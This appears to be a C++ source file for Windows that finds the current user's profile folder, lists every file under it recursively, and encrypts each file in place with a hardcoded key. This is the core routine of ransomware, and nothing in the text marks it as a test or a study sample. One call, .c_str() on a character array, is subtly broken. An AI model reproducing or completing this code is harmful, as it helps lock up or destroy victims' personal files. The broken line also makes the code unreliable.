#include "encrypt.h"

int main() {
    // Get the path to the user's profile folder
    TCHAR userProfileDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfileDir))) {
        // Print the user's profile folder path
        _tprintf(_T("User's profile folder: %s\n"), userProfileDir);

        // Create a vector to store file paths
        std::vector<std::wstring> fileList;

        // Recursively enumerate all files in the user's profile directory
        EnumerateFilesRecursive(userProfileDir.c_str(), fileList);

        // Encrypt each file with the specified key
        LPCTSTR key = TEXT("3igcZhRdWq96m3GUmTAiv9");
        for (const auto& file : fileList) {
            if (!EncryptFileWithKey(file.c_str(), key)) {
                std::wcerr << L"Failed to encrypt file: " << file << std::endl;
            }
        }
    } else {
        // Failed to get the user's profile folder path
        std::wcerr << L"Failed to get user's profile folder." << std::endl;
        return EXIT_FAILURE;
    }

    // Wait for user input before exiting
    getchar();
    
    return EXIT_SUCCESS;
}
